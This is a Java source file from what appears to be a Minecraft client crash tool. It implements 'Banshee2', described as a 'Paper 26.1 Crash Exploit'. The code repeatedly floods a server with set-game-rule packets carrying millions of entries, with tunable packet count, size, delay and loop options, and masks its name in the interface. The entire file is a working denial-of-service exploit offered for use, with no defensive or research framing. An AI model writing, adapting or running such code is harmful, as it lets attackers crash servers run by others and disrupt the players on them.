package us.rin.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import us.rin.crashers.Crasher;
import us.rin.gui.clickgui.ClickGui;
import us.rin.protocol.components.objects.GameRuleEntry;
import us.rin.protocol.packets.PacketCodec;
import us.rin.protocol.packets.play.PacketSetGameRule;
import us.rin.utils.OptionType;
import us.rin.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Banshee2 implements Crasher {
    private static final String METHOD_NAME = "Banshee2";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int threadSleep = Integer.parseInt(args[4]);
        long loopAmount = Long.parseLong(args[5]);
        setEnabled(true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (protocol >= 775) {
            List<GameRuleEntry> gameRuleEntries = new ArrayList<>();
            GameRuleEntry gameRuleEntry = new GameRuleEntry("", "");
            for (int i = 0; i < size; i++)
                gameRuleEntries.add(gameRuleEntry);
            AtomicInteger check = new AtomicInteger(0);
            executorService = Executors.newSingleThreadScheduledExecutor();
            Runnable clickTask = () -> {
                if (!enabled || check.get() == loopAmount || (mc.getConnection() == null || !mc.getConnection().getConnection().isConnected())) {
                    executorService.shutdown();
                    setEnabled(false);
                    msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
                    return;
                }
                PacketCodec.sendPacket(new PacketSetGameRule(gameRuleEntries), packets);
                check.getAndIncrement();
            };
            executorService.scheduleWithFixedDelay(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
        } else {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 26.1+ (Protocol: 775+)&7, and your current protocol is &c" + protocol, true);
        }
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Sleep", OptionType.INTEGER),
                new OptionUtil("Loop", OptionType.INTEGER)
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[40], size[4000000], sleep[1], loop[1]";
    }

    @Override
    public String getDescription() {
        return "Paper 26.1 Crash Exploit";
    }
}